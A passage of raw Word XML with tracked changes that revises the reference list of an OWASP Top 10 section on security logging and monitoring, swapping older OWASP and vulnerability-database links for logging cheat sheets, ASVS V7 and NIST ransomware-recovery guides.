          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4621A3EF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3395" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3396" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [OWASP Proactive Controls: Implement Logging and </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Monitoring](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://owasp.org/www-project-proactive-controls/v3/en/c9-security-logging.html)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="139AD275" w14:textId="07A80B10" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3397" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [OWASP Application Security Verification Standard: </w:t>
      </w:r>
      <w:del w:id="3398" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>V1 Architecture, design</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3399" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>V7 Logging</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:del w:id="3400" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>threat modelling</w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="3401" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Monitoring</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:ins w:id="3402" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>owasp.org/</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>www</w:t>
      </w:r>
      <w:del w:id="3403" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.owasp.org/index.php/ASVS_V1_Architecture)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3404" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-project-application-security-verification-standard)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="54BD0F4C" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3405" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3406" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Dependency Check (for Java and .NET libraries)](https://www.owasp.org/index.php/OWASP_Dependency_Check)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="358882AF" w14:textId="2A10ECCA" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3407" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3408" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3409"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Testing Guide</w:t>
      </w:r>
      <w:del w:id="3410" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> - Map </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3411" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">: Testing for Detailed Error </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Code](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Application</w:t>
      </w:r>
      <w:del w:id="3412" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> Architecture (OTG-INFO-010)](https://www.owasp.org/index.php/Map_</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3413" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>_Security_Testing/08-Testing_for_Error_Handling/01-Testing_for_Error_Code) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="510A458C" w14:textId="6658D4B3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3414" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [OWASP Cheat Sheet: </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Application</w:t>
      </w:r>
      <w:del w:id="3415" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>_Architecture_(OTG-INFO-010))</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3416" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Logging </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Vocabulary](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cheatsheetseries.owasp.org/cheatsheets/Application_Logging_Vocabulary_Cheat_Sheet.html)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="121ADAC3" w14:textId="0A0FC5F3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3417" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3418" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [OWASP </w:t>
      </w:r>
      <w:del w:id="3419" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Virtual Patching Best Practices</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3420" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Cheat Sheet: </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Logging</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="3421" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3422" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheetseries</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.owasp.org/</w:t>
      </w:r>
      <w:del w:id="3423" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/Virtual_Patching_Best_Practices)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3424" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">cheatsheets/Logging_Cheat_Sheet.html)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1A29BBA5" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3425" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E105D8A" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3426" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3427" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### External</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="64E1649A" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3428" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3429" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [The Unfortunate Reality of Insecure Libraries](https://www.aspectsecurity.com/research-presentations/the-unfortunate-reality-of-insecure-libraries)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="35DD503F" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3430" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3431" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [MITRE Common Vulnerabilities and Exposures (CVE) search](https://www.cvedetails.com/version-search.php)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="065C54BC" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3432" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3433" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [National Vulnerability Database (NVD)](https://nvd.nist.gov/)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2B472895" w14:textId="1F2B6D97" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3434" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3435" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [Retire.js</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3436" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [Data Integrity: Recovering from Ransomware and Other Destructive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Events](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://csrc.nist.gov/publications/detail/sp/1800-11/final) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="63ECA961" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3437" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3438" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [Data Integrity: Identifying and Protecting Assets Against Ransomware and Other Destructive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Events](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://csrc.nist.gov/publications/detail/sp/1800-25/final) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="092AD27F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3439" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3440" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">- [Data Integrity: Detecting and Responding to Ransomware and Other Destructive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Events](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://csrc.nist.gov/publications/detail/sp/1800-26/final) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4ADA06F6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3441" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2949E761" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3442" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3443" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## List of Mapped CWEs </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">{{ </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>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 ".mapped </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cwes</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>", id=id ~ "-</w:t>
